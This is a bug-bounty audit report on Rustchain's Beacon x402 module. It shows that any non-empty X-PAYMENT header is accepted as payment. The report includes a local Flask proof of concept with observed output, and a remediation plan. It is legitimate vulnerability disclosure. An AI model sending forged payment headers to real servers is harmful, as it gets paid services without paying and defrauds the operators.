# Audit: Beacon x402 `X-PAYMENT` Header-Presence Bypass (#66)

## Metadata

- Bounty issue: Scottcjn/rustchain-bounties#66
- Auditor: maelrx
- Public RTC wallet: `RTCc068d2850639325b847e09fc6b8c01b0b88d7be8`
- Repository: Scottcjn/Rustchain
- Commit reviewed: `0c428794e85db8ef5a64639e4ccd9b121e40cab1`
- Primary file reviewed: `node/beacon_x402.py`
- Requested severity: High

## Finding

`node/beacon_x402.py` treats the mere presence of an `X-PAYMENT` header as a successful x402 payment. The value is not parsed, decoded, verified with the facilitator, checked for network/asset/recipient/amount/resource binding, or protected against replay before premium Beacon endpoints return paid data.

This affects the paywalled Beacon routes registered in the same module, including:

- `GET /api/premium/reputation`
- `GET /api/premium/contracts/export`

## Locations

- `node/beacon_x402.py:106-143` - `_check_x402_payment()`
- `node/beacon_x402.py:254-280` - `/api/premium/reputation`
- `node/beacon_x402.py:282-315` - `/api/premium/contracts/export`

The vulnerable control flow is:

```python
payment_header = request.headers.get("X-PAYMENT", "")
if not payment_header:
    return False, _cors_json({...}, 402)

# Log payment...
return True, None
```

Any non-empty string reaches `return True, None`.

## Local Reproduction

Run this from the repository root:

```bash
uv run --no-project --with flask python - <<'PY'
import os, sqlite3, tempfile
from flask import Flask
import sys
sys.path.insert(0, 'node')
import beacon_x402

beacon_x402.X402_CONFIG_OK = True
beacon_x402.PRICE_REPUTATION_EXPORT = '0.01'
beacon_x402.PRICE_BEACON_CONTRACT = '0.05'
beacon_x402.X402_NETWORK = 'base-sepolia'
beacon_x402.FACILITATOR_URL = 'https://facilitator.invalid'
beacon_x402.BEACON_TREASURY = '0x' + '11' * 20
beacon_x402.USDC_BASE = '0x' + '22' * 20
beacon_x402.SWAP_INFO = {'network': 'Base'}
beacon_x402.has_cdp_credentials = lambda: True
beacon_x402.is_free = lambda price: str(price) in ('0', '0.0', '0.00', '')
beacon_x402._run_migrations = lambda db_path: None

fd, db_path = tempfile.mkstemp(suffix='.db')
os.close(fd)
conn = sqlite3.connect(db_path)
conn.execute('CREATE TABLE reputation (agent_id TEXT, score REAL)')
conn.execute('INSERT INTO reputation VALUES (?, ?)', ('agent-victim', 99.9))
conn.commit(); conn.close()

def get_db():
    db = sqlite3.connect(db_path)
    db.row_factory = sqlite3.Row
    return db

app = Flask(__name__)
beacon_x402.init_app(app, get_db)
client = app.test_client()

no_payment = client.get('/api/premium/reputation')
fake_payment = client.get(
    '/api/premium/reputation',
    headers={'X-PAYMENT': 'bogus-not-json-not-signed-not-facilitated'}
)

print('no_payment_status', no_payment.status_code)
print('no_payment_error', no_payment.get_json().get('error'))
print('fake_payment_status', fake_payment.status_code)
print('fake_payment_total', fake_payment.get_json().get('total'))
print('fake_payment_first_agent', fake_payment.get_json().get('reputation', [{}])[0].get('agent_id'))

os.unlink(db_path)
PY
```

Observed output:

```text
no_payment_status 402
no_payment_error Payment Required
fake_payment_status 200
fake_payment_total 1
fake_payment_first_agent agent-victim
```

The first request proves the endpoint is configured as paid. The second request proves that a syntactically invalid, unsigned, unfacilitated header unlocks the premium response.

## Expected Behavior

When x402 is enabled and the route has a non-free price, the server should only allow access after verifying a valid payment proof for the exact payment requirement:

- valid x402 payload format
- correct network and asset
- correct `payTo` recipient
- correct amount for the endpoint
- binding to the requested resource/action
- facilitator verification or equivalent on-chain confirmation
- replay prevention for the payment proof or transaction

Malformed or unverifiable `X-PAYMENT` values should return `402` or `401`, not `200`.

## Actual Behavior

Any non-empty `X-PAYMENT` value is accepted. `_check_x402_payment()` logs `"unknown"` as payer and returns success without any validation. A caller can access paid Beacon exports without paying.

## Impact

This is a direct middleware bypass for Beacon x402 monetization:

- unpaid access to premium data exports
- fake payment records in `x402_beacon_payments`
- no amount, recipient, asset, network, resource, or replay enforcement
- undermines the x402 bounty goal of requiring valid RTC/payment proof before service access

The issue is separate from the historical replay fix in PR #149, which modified `x402/rtc_payment_middleware.py`. This finding is in `node/beacon_x402.py`, and the current implementation never calls the verified middleware or facilitator path.

Prior duplicate triage: PR #1959 mentioned a broad x402 header-manipulation class, but that PR was closed without merge and `origin/main` still contains this route-level bypass. This report is scoped to the current Beacon implementation and includes an endpoint-level Flask PoC.

## Suggested Fix

Replace the header-presence check with real x402 verification before returning success. A safe remediation should:

1. Parse the `X-PAYMENT` payload and reject malformed values.
2. Verify the payment through the configured facilitator or the existing `x402/rtc_payment_middleware.py` verification logic.
3. Bind the payment to `request.url`, `action_name`, expected amount, recipient, asset, and network.
4. Persist and reject replayed payment identifiers.
5. Only insert a payment log after verification succeeds, with the real payer address and transaction/proof identifier.

Fail closed when `X402_CONFIG_OK` is true and verification dependencies are unavailable.

## Confidence

High. The local PoC exercises the Flask route and demonstrates the paid/no-paid branch difference using only a temporary SQLite database and Flask `test_client()`.

Severity confidence: High for x402 auth/payment bypass. It is not classified Critical because the PoC demonstrates unpaid service access rather than direct fund drain.
